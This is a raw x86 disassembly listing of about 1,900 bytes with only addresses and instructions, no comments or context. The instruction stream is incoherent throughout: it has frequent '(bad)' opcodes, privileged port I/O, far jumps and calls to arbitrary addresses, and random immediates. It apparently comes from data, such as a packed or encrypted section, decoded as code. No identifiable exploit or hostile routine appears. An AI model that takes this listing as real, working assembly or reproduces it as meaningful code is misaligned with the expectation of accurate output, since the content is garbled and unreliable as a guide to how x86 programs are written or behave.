  41f0df:	leave  
  41f0e0:	test   BYTE PTR [ebp+0x70],0x99
  41f0e4:	mov    ecx,0x869c8bb1
  41f0e9:	mov    gs,WORD PTR [ebx+ecx*4]
  41f0ec:	or     BYTE PTR [edi-0xcd1c79a],ah
  41f0f2:	rcr    DWORD PTR [edi],0x7c
  41f0f5:	and    DWORD PTR [esi+0x75294fbf],0xffffffc3
  41f0fc:	mov    bl,0x6a
  41f0fe:	add    al,0xc4
  41f100:	imul   ebp,DWORD PTR [ecx-0x5b],0xfffffff3
  41f104:	lahf   
  41f105:	mov    al,ds:0x745d1ebf
  41f10a:	lahf   
  41f10b:	and    al,0x11
  41f10d:	scas   al,BYTE PTR es:[edi]
  41f10e:	xchg   edx,eax
  41f10f:	adc    BYTE PTR [edi-0xc40be44],dl
  41f115:	inc    ebp
  41f116:	or     eax,0xc2e8a7d9
  41f11b:	push   esp
  41f11c:	int    0x53
  41f11e:	jo     0x41f12d
  41f120:	add    ch,BYTE PTR [edi+0x1ea5c193]
  41f126:	popa   
  41f127:	in     al,dx
  41f128:	jmp    0xcb9a75a4
  41f12d:	or     edx,edx
  41f12f:	leave  
  41f130:	out    0x14,al
  41f132:	push   cs
  41f133:	aaa    
  41f134:	jnp    0x41f0e0
  41f136:	loopne 0x41f197
  41f138:	push   es
  41f139:	pop    ebx
  41f13a:	mov    ?,WORD PTR [edx+0x7c8e996f]
  41f140:	psubusb mm4,QWORD PTR [ebp-0x56b85526]
  41f147:	push   esi
  41f148:	adc    al,0xf2
  41f14a:	inc    esp
  41f14b:	push   ebp
  41f14c:	sahf   
  41f14d:	lods   eax,DWORD PTR ds:[esi]
  41f14e:	test   DWORD PTR [eax-0x63],edi
  41f151:	aad    0xe
  41f153:	loopne 0x41f0e1
  41f155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f156:	ja     0x41f192
  41f158:	rol    ebx,cl
  41f15a:	add    esp,esi
  41f15c:	retf   0x237d
  41f15f:	mov    ecx,0xccc78d3c
  41f164:	push   ss
  41f165:	ja     0x41f1de
  41f167:	shr    ebx,0xbd
  41f16a:	mov    dh,0xa6
  41f16c:	daa    
  41f16d:	retf   
  41f16e:	jnp    0x41f133
  41f170:	icebp  
  41f171:	jg     0x41f13f
  41f173:	lds    ebx,FWORD PTR [ebx+eiz*4-0x6add393d]
  41f17a:	into   
  41f17b:	jge    0x41f1b9
  41f17d:	push   esp
  41f17e:	retf   
  41f17f:	mov    ds,WORD PTR [edx-0x788d7915]
  41f185:	aaa    
  41f186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f187:	jnp    0x41f15c
  41f189:	stos   DWORD PTR es:[edi],eax
  41f18a:	outs   dx,BYTE PTR ds:[esi]
  41f18b:	xchg   BYTE PTR [ebx-0x33],dh
  41f18e:	or     edx,edx
  41f190:	std    
  41f191:	sahf   
  41f192:	dec    ebp
  41f193:	les    eax,FWORD PTR [edi+0x73]
  41f196:	pop    ebp
  41f197:	adc    ch,dh
  41f199:	and    al,0x58
  41f19b:	jno    0x41f17f
  41f19d:	cmp    al,0x4e
  41f19f:	cmp    dh,al
  41f1a1:	sbb    al,0x13
  41f1a3:	in     eax,dx
  41f1a4:	pop    edx
  41f1a5:	lods   eax,DWORD PTR ds:[esi]
  41f1a6:	sbb    eax,esi
  41f1a8:	cmc    
  41f1a9:	mov    dh,0x3b
  41f1ab:	push   0xd944d761
  41f1b0:	or     bh,BYTE PTR [ebx]
  41f1b2:	or     al,al
  41f1b4:	and    DWORD PTR [edx],edx
  41f1b6:	xchg   ebx,eax
  41f1b7:	les    ebx,FWORD PTR [eax]
  41f1b9:	xor    eax,0x7ff0c2e6
  41f1be:	jle    0x41f1be
  41f1c0:	or     ecx,DWORD PTR [eax-0x4f]
  41f1c3:	or     edx,0x32
  41f1c6:	push   es
  41f1c7:	lock cmp BYTE PTR [ebp+ecx*2+0x74],ah
  41f1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1cd:	mov    dl,0xe2
  41f1cf:	out    dx,eax
  41f1d0:	pop    dx
  41f1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1d3:	cmp    eax,0xc57ea15f
  41f1d8:	inc    ecx
  41f1d9:	loopne 0x41f210
  41f1db:	into   
  41f1dc:	sub    eax,0x63cb9ec5
  41f1e1:	push   0xfd185ed4
  41f1e6:	and    eax,0x8fb6cf19
  41f1eb:	(bad)  
  41f1ec:	jb     0x41f268
  41f1ee:	fcomp  st(2)
  41f1f0:	iret   
  41f1f1:	mov    al,0x4e
  41f1f3:	sub    dh,BYTE PTR [edx]
  41f1f5:	mov    dl,0x18
  41f1f7:	sub    ecx,DWORD PTR [edi+0x114be347]
  41f1fd:	fmul   st,st(0)
  41f1ff:	adc    eax,0xe71fda69
  41f204:	xchg   edi,eax
  41f205:	push   ebp
  41f206:	jmp    0xb88c:0x70e63e56
  41f20d:	sti    
  41f20e:	loopne 0x41f1c6
  41f210:	jp     0x41f232
  41f212:	mov    ebx,0x9799fdc8
  41f217:	mov    al,0xca
  41f219:	and    BYTE PTR [edx-0xb2a5a21],ah
  41f21f:	cld    
  41f220:	push   0x491861f0
  41f225:	jb     0x41f25e
  41f227:	inc    ecx
  41f228:	test   edi,ebx
  41f22a:	adc    dl,BYTE PTR [eax]
  41f22c:	add    BYTE PTR [ecx-0x67ee384e],dl
  41f232:	icebp  
  41f233:	add    BYTE PTR [edi-0x59],0xa7
  41f237:	adc    eax,0x1e46e2a2
  41f23c:	push   eax
  41f23d:	lods   eax,DWORD PTR ds:[esi]
  41f23e:	test   cl,al
  41f240:	jge    0x41f28e
  41f242:	lea    edi,[ebx-0x4f]
  41f245:	fistp  WORD PTR [edi]
  41f247:	push   edx
  41f248:	loopne 0x41f299
  41f24a:	mov    dh,0x36
  41f24c:	fnstenv [edx+0x39]
  41f24f:	out    0x8e,eax
  41f251:	dec    DWORD PTR [edx]
  41f253:	iret   
  41f254:	(bad)  [eax]
  41f256:	rcl    BYTE PTR [ebx-0x6a2ef438],0x5e
  41f25d:	sbb    ah,BYTE PTR ss:[ebx]
  41f260:	cmp    dh,dl
  41f262:	adc    dl,BYTE PTR [ebx]
  41f264:	stc    
  41f265:	scas   al,BYTE PTR es:[edi]
  41f266:	mov    ah,0xe1
  41f268:	jns    0x41f23b
  41f26a:	ret    0x8ff8
  41f26d:	pop    ecx
  41f26e:	xor    al,0x24
  41f270:	iret   
  41f271:	mov    dh,0x2a
  41f273:	mov    al,ds:0x904197e1
  41f278:	lods   eax,DWORD PTR ds:[esi]
  41f279:	iret   
  41f27a:	add    BYTE PTR [ebx],dl
  41f27c:	(bad)  
  41f27d:	out    dx,al
  41f27e:	xor    al,0x68
  41f280:	(bad)  
  41f281:	arpl   WORD PTR [ebx+0x42],ax
  41f284:	mov    bh,0x4d
  41f286:	mov    dl,0x7e
  41f288:	sbb    BYTE PTR [edi],dh
  41f28a:	xor    edx,DWORD PTR [ebx+0x29]
  41f28d:	fdivr  QWORD PTR [ebx]
  41f28f:	push   ebx
  41f290:	add    al,BYTE PTR [edi]
  41f292:	scas   al,BYTE PTR es:[edi]
  41f293:	xor    cl,BYTE PTR [edx+0x7e]
  41f296:	adc    al,0x17
  41f298:	addr16 pushf 
  41f29a:	(bad)  
  41f29b:	mov    esp,eax
  41f29d:	inc    ecx
  41f29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f29f:	nop
  41f2a0:	popa   
  41f2a1:	jmp    0x6ba54c10
  41f2a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2a7:	fisub  DWORD PTR cs:[esi]
  41f2aa:	pushf  
  41f2ab:	(bad)  
  41f2ac:	nop
  41f2ad:	sbb    DWORD PTR [edx+ecx*4-0x778fe053],eax
  41f2b4:	popf   
  41f2b5:	sbb    ah,BYTE PTR [edi]
  41f2b7:	mov    edx,0x9a6dcfa7
  41f2bc:	lods   eax,DWORD PTR ds:[esi]
  41f2bd:	mov    DWORD PTR [eax-0x50],ecx
  41f2c0:	adc    DWORD PTR [edx+0x15],edi
  41f2c3:	adc    edx,ebx
  41f2c5:	imul   edi,DWORD PTR [edx],0xffffffcd
  41f2c8:	mov    eax,ds:0x427f3714
  41f2cd:	cli    
  41f2ce:	inc    esp
  41f2cf:	add    DWORD PTR [edx],ebx
  41f2d1:	pop    ds
  41f2d2:	out    0x20,al
  41f2d4:	push   ebx
  41f2d5:	test   al,0x56
  41f2d7:	or     BYTE PTR [ecx+0x35c35d5b],ch
  41f2dd:	xor    al,0xa6
  41f2df:	push   ecx
  41f2e0:	or     eax,0x4c982b6e
  41f2e5:	dec    eax
  41f2e6:	push   ecx
  41f2e7:	stos   BYTE PTR es:[edi],al
  41f2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e9:	cmp    al,0x40
  41f2eb:	int3   
  41f2ec:	or     DWORD PTR [ebx-0x1],edi
  41f2ef:	xchg   edi,eax
  41f2f0:	and    eax,0x40742cf8
  41f2f5:	dec    edi
  41f2f6:	mov    dh,0x9c
  41f2f8:	or     esp,DWORD PTR [ebx+eiz*2+0x74fd199b]
  41f2ff:	push   edi
  41f300:	sahf   
  41f301:	inc    ebp
  41f302:	bnd jae 0x41f33e
  41f305:	daa    
  41f306:	jle    0x41f2b5
  41f308:	xor    bh,bh
  41f30a:	cld    
  41f30b:	es addr16 (bad) 
  41f30e:	es ins BYTE PTR es:[edi],dx
  41f310:	cmp    BYTE PTR [edi-0x4489013f],ah
  41f316:	shr    DWORD PTR [ebx],1
  41f318:	stc    
  41f319:	retf   0x8823
  41f31c:	push   ebx
  41f31d:	leave  
  41f31e:	fistp  WORD PTR [ebx-0x1c]
  41f321:	pusha  
  41f322:	arpl   WORD PTR [edi],si
  41f324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f325:	ins    DWORD PTR es:[edi],dx
  41f326:	addr16 sub eax,edi
  41f329:	xchg   ax,ax
  41f32b:	popa   
  41f32c:	push   esp
  41f32d:	(bad)  
  41f32e:	fadd   st,st(4)
  41f330:	push   ds
  41f331:	test   BYTE PTR [edx+0x465491be],0x82
  41f338:	(bad)  
  41f339:	stos   DWORD PTR es:[edi],eax
  41f33a:	mov    ah,0x40
  41f33c:	js     0x41f387
  41f33e:	mov    dl,0x85
  41f340:	sub    al,0xa0
  41f342:	(bad)  
  41f345:	xchg   edx,eax
  41f346:	mov    edi,0x11a31a5b
  41f34b:	jo     0x41f2d3
  41f34d:	stos   DWORD PTR es:[edi],eax
  41f34e:	stc    
  41f34f:	shr    DWORD PTR [ebx-0x792badaf],0x7d
  41f356:	mov    ?,WORD PTR [edi]
  41f358:	xchg   edi,eax
  41f359:	mov    edi,0xc7b40a62
  41f35e:	dec    esp
  41f35f:	ins    BYTE PTR es:[edi],dx
  41f360:	shl    BYTE PTR [edi+0x19d1e1d7],cl
  41f366:	rcr    DWORD PTR [edx],cl
  41f368:	ficomp WORD PTR [ebx]
  41f36a:	aam    0x41
  41f36c:	pop    ds
  41f36d:	sub    DWORD PTR [edi-0x4e],ebx
  41f370:	mov    ch,0x86
  41f372:	xor    al,0x78
  41f374:	leave  
  41f375:	call   0xe0b08d17
  41f37a:	xchg   esp,eax
  41f37b:	xchg   ebx,eax
  41f37c:	rcl    DWORD PTR [esi-0x70],1
  41f37f:	imul   edi,DWORD PTR [eax-0x64],0x98a568d6
  41f386:	fisttp WORD PTR [ecx]
  41f388:	inc    esi
  41f389:	ret    0x6c3b
  41f38c:	pop    esp
  41f38d:	ins    DWORD PTR es:[edi],dx
  41f38e:	jae    0x41f35f
  41f390:	(bad)  
  41f391:	aaa    
  41f392:	add    DWORD PTR [eax-0x1670d63],0x54
  41f399:	and    cl,BYTE PTR [eax+0x1]
  41f39c:	xor    BYTE PTR [edi+0x5d04128],dh
  41f3a2:	(bad)  
  41f3a3:	leave  
  41f3a4:	inc    edi
  41f3a5:	stos   DWORD PTR es:[edi],eax
  41f3a6:	imul   DWORD PTR [ecx+0x3ecb26c0]
  41f3ac:	fsubr  DWORD PTR [eax-0x44]
  41f3af:	pusha  
  41f3b0:	test   DWORD PTR [ecx],ebp
  41f3b2:	xor    eax,0x47a6db20
  41f3b7:	pusha  
  41f3b8:	inc    ebx
  41f3b9:	sub    bl,BYTE PTR ss:[ecx]
  41f3bc:	(bad)  
  41f3bd:	out    dx,al
  41f3be:	xchg   DWORD PTR [eax+0x34642410],ebp
  41f3c4:	les    esp,FWORD PTR [edi-0x23]
  41f3c7:	sti    
  41f3c8:	loopne 0x41f3b0
  41f3ca:	ret    
  41f3cb:	test   DWORD PTR [eiz*8+0x1a758f97],esp
  41f3d2:	out    dx,al
  41f3d3:	push   ds
  41f3d4:	icebp  
  41f3d5:	xor    cl,al
  41f3d7:	mov    esi,0xc2b1c8bb
  41f3dc:	std    
  41f3dd:	adc    bl,ah
  41f3df:	xchg   esp,eax
  41f3e0:	dec    ecx
  41f3e1:	(bad)
  41f3e4:	call   0xa27f9deb
  41f3e9:	rol    DWORD PTR [ecx-0x54],0xf5
  41f3ed:	(bad)
  41f3f1:	inc    esp
  41f3f2:	icebp  
  41f3f3:	or     DWORD PTR [esi+edx*4-0x30],esi
  41f3f7:	and    dh,BYTE PTR [ebp+ebx*1-0x14b88cc1]
  41f3fe:	push   ebx
  41f3ff:	(bad)  
  41f400:	aaa    
  41f401:	ja     0x41f3e6
  41f403:	arpl   WORD PTR [ebx-0x6c],di
  41f406:	mov    dh,0xe4
  41f408:	cmc    
  41f409:	xor    eax,0x3fea3431
  41f40e:	xchg   esi,eax
  41f40f:	jne    0x41f485
  41f411:	inc    ecx
  41f412:	fs hlt 
  41f414:	xor    dl,BYTE PTR [ebp+edi*1+0x6a4dbd87]
  41f41b:	jnp    0x41f3d1
  41f41d:	fwait
  41f41e:	popf   
  41f41f:	test   al,0x84
  41f421:	lock mov ds:0xde127c28,al
  41f427:	xor    DWORD PTR [eax],ebx
  41f429:	div    ebp
  41f42b:	call   0x6e6df012
  41f430:	cmp    BYTE PTR [eax+0x19],dl
  41f433:	stc    
  41f434:	daa    
  41f435:	jmp    DWORD PTR [eax]
  41f437:	mov    ah,0x91
  41f439:	pop    ss
  41f43a:	out    dx,eax
  41f43b:	lods   al,BYTE PTR ds:[esi]
  41f43c:	out    0xe8,al
  41f43e:	pushf  
  41f43f:	ror    DWORD PTR [edi+0x303be3a7],0xae
  41f446:	xor    eax,esi
  41f448:	div    ah
  41f44a:	or     bl,BYTE PTR [edx+0x54]
  41f44d:	cmp    eax,0xbd65e742
  41f453:	push   0x78
  41f455:	mov    edi,0x28188242
  41f45a:	and    DWORD PTR [ebx+0x1ffead23],edx
  41f460:	sub    ecx,DWORD PTR [edx-0x53]
  41f463:	fdivr  QWORD PTR [ecx-0x17983fe6]
  41f469:	and    eax,0x20c53fcb
  41f46e:	add    eax,0x409d95fc
  41f473:	mov    dh,0x7c
  41f475:	pop    ds
  41f476:	js     0x41f4d4
  41f478:	imul   ecx,eax,0x65
  41f47b:	push   0xeff7f431
  41f480:	(bad)  
  41f482:	inc    edi
  41f483:	cld    
  41f484:	xchg   esi,eax
  41f486:	cmp    al,0x9d
  41f488:	jb     0x41f435
  41f48a:	xchg   ebp,eax
  41f48b:	xchg   ecx,eax
  41f48c:	aaa    
  41f48d:	mul    DWORD PTR [ebx]
  41f48f:	dec    DWORD PTR [ebx]
  41f491:	(bad)  
  41f492:	(bad)  
  41f493:	ror    DWORD PTR [edi-0x46],cl
  41f496:	or     eax,0x5414c88
  41f49b:	gs jne 0x41f4f8
  41f49e:	clc    
  41f49f:	inc    ecx
  41f4a0:	shl    esp,1
  41f4a2:	addr16 mov bl,0xc4
  41f4a5:	dec    esp
  41f4a6:	in     eax,dx
  41f4a7:	pop    edx
  41f4a8:	push   es
  41f4a9:	xchg   edx,eax
  41f4aa:	adc    al,0xdd
  41f4ac:	repnz int 0x9
  41f4af:	pop    esi
  41f4b0:	mov    edx,0x39a52807
  41f4b5:	sub    DWORD PTR [ebp-0x11fcdc46],edi
  41f4bb:	jno    0x41f44f
  41f4bd:	add    eax,0xb6144122
  41f4c2:	retf   
  41f4c3:	pop    ss
  41f4c4:	dec    edi
  41f4c5:	or     al,0x95
  41f4c7:	mov    ebx,0x640f9ab9
  41f4cc:	inc    ecx
  41f4cd:	popa   
  41f4ce:	dec    ebp
  41f4cf:	or     eax,0xdf4ed420
  41f4d4:	jbe    0x41f49a
  41f4d6:	push   ebp
  41f4d7:	lahf   
  41f4d8:	jle    0x41f46c
  41f4da:	(bad)  
  41f4db:	xchg   esp,eax
  41f4dc:	lea    edx,[esi+0x35]
  41f4df:	mov    esp,esi
  41f4e1:	les    ecx,FWORD PTR [ebx-0x53469086]
  41f4e7:	mov    esp,0xa7b45fe6
  41f4ec:	test   al,0xab
  41f4ee:	es dec ebp
  41f4f0:	jge    0x41f530
  41f4f2:	loopne 0x41f4f3
  41f4f4:	jb     0x41f4ab
  41f4f6:	test   al,0x86
  41f4f8:	ret    0x46de
  41f4fb:	push   cs
  41f4fc:	mov    dh,0xfc
  41f4fe:	mov    cl,BYTE PTR [eax+0x77474126]
  41f504:	xchg   ecx,eax
  41f505:	dec    esp
  41f506:	push   esi
  41f507:	sbb    bh,bh
  41f509:	arpl   WORD PTR [ebx+0x106487f8],ax
  41f50f:	ficomp WORD PTR [ebx+0x1b2dbd05]
  41f515:	mov    cs,WORD PTR [eax]
  41f517:	ret    
  41f518:	test   DWORD PTR [eax-0x1eaf9c3],ebx
  41f51e:	outs   dx,DWORD PTR ds:[esi]
  41f51f:	sbb    ch,ch
  41f521:	int3   
  41f522:	jg     0x41f545
  41f524:	mov    ah,BYTE PTR [esi+0x1d1d700a]
  41f52a:	push   edi
  41f52b:	pusha  
  41f52c:	int    0x5e
  41f52e:	sub    esi,eax
  41f530:	mov    dh,0xe4
  41f532:	fldcw  WORD PTR [eax-0x38e58d9d]
  41f538:	xchg   edi,eax
  41f539:	daa    
  41f53a:	dec    esi
  41f53b:	dec    esi
  41f53c:	arpl   WORD PTR [ebp-0x5e],dx
  41f53f:	in     al,dx
  41f540:	jmp    0xf9135561
  41f545:	add    cl,ah
  41f547:	inc    edi
  41f548:	lods   al,BYTE PTR ds:[esi]
  41f549:	push   ebx
  41f54a:	in     eax,0x37
  41f54c:	jge    0x41f562
  41f54e:	adc    al,0xd2
  41f550:	inc    ebp
  41f551:	int3   
  41f552:	out    0xe,al
  41f554:	mov    al,ds:0x4fd5eedf
  41f559:	mov    al,0x42
  41f55b:	jns    0x41f5cf
  41f55d:	leave  
  41f55e:	pop    ds
  41f55f:	stos   DWORD PTR es:[edi],eax
  41f560:	out    dx,eax
  41f561:	add    cl,BYTE PTR [eax-0x73a278c0]
  41f567:	pop    esp
  41f568:	mov    BYTE PTR [ebp+0x689decdf],bl
  41f56e:	(bad)  
  41f56f:	lods   al,BYTE PTR ds:[esi]
  41f570:	sahf   
  41f571:	or     eax,0x8cd3658d
  41f576:	sub    ebx,DWORD PTR [edi-0x54]
  41f579:	aam    0x4b
  41f57b:	in     eax,0x26
  41f57d:	cwde   
  41f57e:	in     eax,dx
  41f57f:	ret    
  41f580:	xchg   ebx,eax
  41f581:	ds fwait
  41f583:	dec    esp
  41f584:	jb     0x41f597
  41f586:	adc    al,0xc2
  41f588:	mov    gs:0x46cc4,eax
  41f58e:	sar    edx,0x2f
  41f591:	sbb    ebx,esp
  41f593:	pop    ebx
  41f594:	mov    edi,0xedb727fd
  41f599:	sahf   
  41f59a:	ficom  WORD PTR ds:0xe76be61f
  41f5a0:	icebp  
  41f5a1:	pavgb  mm0,mm2
  41f5a4:	add    eax,0xad8a22a7
  41f5a9:	ss mov al,0x3e
  41f5ac:	or     DWORD PTR [edi],ebp
  41f5ae:	jne    0x41f5ae
  41f5b0:	jl     0x41f53a
  41f5b2:	retf   
  41f5b3:	xchg   BYTE PTR [ebx-0x11e6558f],ah
  41f5b9:	rcr    DWORD PTR [esi+0x12],1
  41f5bc:	xor    al,0x16
  41f5be:	in     al,0xa4
  41f5c0:	jp     0x41f555
  41f5c2:	xchg   DWORD PTR [esi-0x1df6ee88],edi
  41f5c8:	adc    eax,0x9d9ebae9
  41f5cd:	push   ss
  41f5ce:	aaa    
  41f5cf:	(bad)  
  41f5d0:	inc    ebx
  41f5d1:	sti    
  41f5d2:	mov    ds:0x8d091490,al
  41f5d7:	scas   al,BYTE PTR es:[edi]
  41f5d8:	push   0x4e
  41f5da:	sub    bh,ch
  41f5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5dd:	push   edx
  41f5de:	adc    edx,DWORD PTR [edi+0x16]
  41f5e1:	lahf   
  41f5e2:	sub    bh,BYTE PTR [edx+ebp*1-0x58769d39]
  41f5e9:	cmp    al,0x8
  41f5eb:	lds    eax,FWORD PTR ds:0xa0b97462
  41f5f1:	mov    dh,0xf8
  41f5f3:	push   cs
  41f5f4:	int3   
  41f5f5:	xchg   edx,eax
  41f5f6:	sbb    eax,0x7a4b1cb5
  41f5fb:	xor    al,0xf7
  41f5fd:	sbb    al,0xb1
  41f5ff:	lahf   
  41f600:	inc    ebp
  41f601:	push   ss
  41f602:	pusha  
  41f603:	inc    ebp
  41f604:	mov    ch,0xd
  41f606:	adc    eax,0x43cd2910
  41f60b:	cmp    eax,0xce030414
  41f610:	adc    ah,BYTE PTR [edx+0x45953d28]
  41f616:	inc    esi
  41f617:	push   ss
  41f618:	sbb    DWORD PTR [esp+ecx*8-0x104830d4],0x7b9191b0
  41f623:	shr    BYTE PTR [eax+0x1b32ca36],cl
  41f629:	mov    ah,BYTE PTR [eax+0x6b]
  41f62c:	sub    ecx,ecx
  41f62e:	pop    ss
  41f62f:	mov    DWORD PTR [ebx+eax*4],ebp
  41f632:	push   ss
  41f633:	mov    ds:0xa14316c6,al
  41f638:	jbe    0x41f646
  41f63a:	(bad)  
  41f63b:	cli    
  41f63c:	push   edx
  41f63d:	jecxz  0x41f615
  41f63f:	stos   BYTE PTR es:[edi],al
  41f640:	popa   
  41f641:	loope  0x41f5c6
  41f643:	xor    al,0x98
  41f645:	out    dx,eax
  41f646:	or     BYTE PTR [eax+0x695c13d9],ah
  41f64c:	sub    eax,0xacdb47b2
  41f651:	cmp    DWORD PTR [esi-0x5891494d],ecx
  41f657:	lock ja 0x41f62c
  41f65a:	xchg   ecx,eax
  41f65b:	mov    dh,ch
  41f65d:	sbb    al,0x49
  41f65f:	xor    eax,0xd8397e1b
  41f664:	out    0xa3,al
  41f666:	fidivr WORD PTR [eax-0x2ac663cd]
  41f66c:	cdq    
  41f66d:	mov    eax,0x8a6abc99
  41f672:	xchg   DWORD PTR [esi-0x20bae194],ebp
  41f678:	jae    0x41f665
  41f67a:	pop    eax
  41f67b:	fs std 
  41f67d:	jge    0x41f6af
  41f67f:	lods   al,BYTE PTR ds:[esi]
  41f680:	outs   dx,DWORD PTR ds:[esi]
  41f681:	bound  edi,QWORD PTR [edx-0x2e]
  41f684:	nop
  41f685:	pop    esi
  41f686:	sbb    al,0x68
  41f688:	xor    BYTE PTR [edi-0x30],bh
  41f68b:	or     eax,ebp
  41f68d:	cdq    
  41f68e:	dec    esi
  41f68f:	aaa    
  41f690:	jbe    0x41f65e
  41f692:	fiadd  DWORD PTR [ebx]
  41f694:	jmp    0x41f66a
  41f696:	cs pop eax
  41f698:	call   0x9f0e050d
  41f69d:	mov    esp,0xc7f6de96
  41f6a2:	mov    bh,BYTE PTR [eax-0x640346db]
  41f6a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6a9:	xchg   edx,eax
  41f6aa:	das    
  41f6ab:	adc    DWORD PTR [ecx-0x49],edx
  41f6ae:	aam    0xa6
  41f6b0:	xchg   ebx,eax
  41f6b1:	or     eax,0x5d5cdc7c
  41f6b6:	sbb    eax,0x109b02b3
  41f6bb:	out    dx,al
  41f6bc:	test   esi,esp
  41f6be:	mov    esi,0x4e3f60de
  41f6c3:	pop    ecx
  41f6c4:	ss addr16 jb 0x41f6a7
  41f6c8:	ret    0x4639
  41f6cb:	pushf  
  41f6cc:	push   esp
  41f6cd:	dec    edx
  41f6ce:	(bad)  
  41f6d0:	cmp    edi,esp
  41f6d2:	ja     0x41f6b9
  41f6d4:	jns    0x41f678
  41f6d6:	loopne 0x41f6d8
  41f6d8:	cmp    DWORD PTR [edx],0x5c
  41f6db:	pushf  
  41f6dc:	mov    ebp,0xb470e5b3
  41f6e1:	ror    bl,cl
  41f6e3:	mov    edx,0xd93a8c1d
  41f6e8:	mov    eax,0x39686609
  41f6ed:	pop    eax
  41f6ee:	cli    
  41f6ef:	adc    DWORD PTR ds:0x9b5f9896,ebp
  41f6f5:	cdq    
  41f6f6:	and    edx,DWORD PTR [ebx-0x1b9a0603]
  41f6fc:	inc    edi
  41f6fd:	fsub   QWORD PTR [ebp-0x3a]
  41f700:	(bad)  
  41f701:	mov    al,0xc
  41f703:	in     eax,dx
  41f704:	es jno 0x41f786
  41f707:	loope  0x41f6b7
  41f709:	mov    ebp,esi
  41f70b:	mov    eax,0x39d8a31a
  41f710:	xor    ebx,DWORD PTR [ebx+0x77dda817]
  41f716:	pop    es
  41f717:	pushf  
  41f718:	xor    BYTE PTR [eax-0x60],bl
  41f71b:	nop
  41f71c:	pop    edx
  41f71d:	(bad)  
  41f71f:	mov    ch,0x1f
  41f721:	mov    eax,ds:0xee7f7897
  41f726:	jl     0x41f6ee
  41f728:	pushf  
  41f729:	jno    0x41f6e5
  41f72b:	sub    eax,0x4710a35f
  41f730:	dec    ecx
  41f731:	ins    BYTE PTR es:[edi],dx
  41f732:	outs   dx,DWORD PTR ds:[esi]
  41f733:	test   eax,0x872266aa
  41f738:	xchg   BYTE PTR [ecx+ebp*2],al
  41f73b:	xlat   BYTE PTR ds:[ebx]
  41f73c:	pop    esp
  41f73d:	inc    ebp
  41f73e:	fdivr  DWORD PTR [esi]
  41f740:	mov    esi,0x123b725
  41f745:	mov    cl,0x38
  41f747:	adc    eax,0x6af179e2
  41f74c:	ss popf 
  41f74e:	ret    0xb3ce
  41f751:	shl    DWORD PTR [ecx+0x11],cl
  41f754:	sahf   
  41f755:	test   al,0x5f
  41f757:	aam    0xa6
  41f759:	pushf  
  41f75a:	fisubr WORD PTR [ecx+ebx*2]
  41f75d:	push   ds
  41f75e:	es pop ss
  41f760:	js     0x41f7a6
  41f762:	push   eax
  41f763:	std    
  41f764:	adc    dh,bh
  41f766:	add    al,0xa9
  41f768:	mov    dh,0x78
  41f76a:	in     eax,dx
  41f76b:	jbe    0x41f7e8
  41f76d:	add    ebx,DWORD PTR [edx]
  41f76f:	(bad)
  41f772:	add    al,0x30
  41f774:	sbb    ch,BYTE PTR [eax]
  41f776:	add    eax,0xc7a29cef
  41f77b:	and    al,ch
  41f77d:	push   esp
  41f77e:	xchg   DWORD PTR [edx],ebx
  41f780:	mov    ds:0x66c09a21,al
  41f785:	stos   BYTE PTR es:[edi],al
  41f786:	ja     0x41f713
  41f788:	pop    es
  41f789:	sub    al,bl
  41f78b:	cs call 0x391c8669
  41f791:	retf   
  41f792:	(bad)  
  41f793:	dec    edi
  41f794:	into   
  41f795:	test   eax,0xcb3da67f
  41f79a:	add    bl,ch
  41f79c:	or     DWORD PTR [ebp-0x53],ecx
  41f79f:	fsubr  DWORD PTR [esp+edx*1-0x60421c46]
  41f7a6:	fild   QWORD PTR [eax+0x21fa30f5]
  41f7ac:	sar    DWORD PTR [esi],0xb
  41f7af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7b0:	jmp    0x41f795
  41f7b2:	push   edx
  41f7b3:	mov    ebp,0xd58233cc
  41f7b8:	fs test eax,0x8e3bf73b
  41f7be:	mov    eax,ds:0xab7b7ef5
  41f7c3:	adc    bl,BYTE PTR [edx-0x1bf56864]
  41f7c9:	stos   BYTE PTR es:[edi],al
  41f7ca:	cmp    cl,BYTE PTR [ecx+0x45014c47]
  41f7d0:	fidiv  WORD PTR [edi-0x3f09daa3]
  41f7d6:	aam    0xf5
  41f7d8:	fidivr DWORD PTR [eax-0x223a9d63]
  41f7de:	xchg   ebx,eax
  41f7df:	inc    eax
  41f7e0:	xchg   BYTE PTR [ebx+0x3b25421c],ch
  41f7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e7:	pop    edx
  41f7e8:	sub    eax,0xe46d3344
  41f7ed:	or     eax,0xf851c16
  41f7f2:	inc    ebp
  41f7f3:	lock jmp 0x789c:0xb5afd5f5
  41f7fb:	xor    al,0xf7
  41f7fd:	add    DWORD PTR [esi],eax
  41f7ff:	out    dx,al
  41f800:	stc    
  41f801:	sbb    eax,eax
  41f803:	fs loopne 0x41f796
  41f806:	lods   eax,DWORD PTR ds:[esi]
  41f807:	mov    eax,0x72dda0c4
  41f80c:	push   ds
  41f80d:	loop   0x41f7fd
  41f80f:	mov    ecx,0xd8098468
  41f814:	les    edx,FWORD PTR [edx]
  41f816:	lods   al,BYTE PTR ds:[esi]
  41f817:	add    eax,0x71ec6e03
  41f81c:	mov    ds:0x712fcb8a,eax
  41f821:	or     al,0x33
  41f823:	loop   0x41f893
  41f825:	popa   
  41f826:	or     al,0x5d
  41f828:	push   edi
  41f829:	xchg   ecx,eax
  41f82a:	je     0x41f861
  41f82c:	in     al,0x5a
  41f82e:	aas    
  41f82f:	sub    al,0x6
  41f831:	mov    BYTE PTR [ecx-0xbb139f2],bh
  41f837:	jo     0x41f825
  41f839:	mov    ah,0x52
  41f83b:	add    eax,0xe1283dfd
  41f840:	dec    eax
  41f841:	test   eax,0x2ac95e71
  41f846:	dec    ebp
  41f847:	test   BYTE PTR [edi-0x62],bh
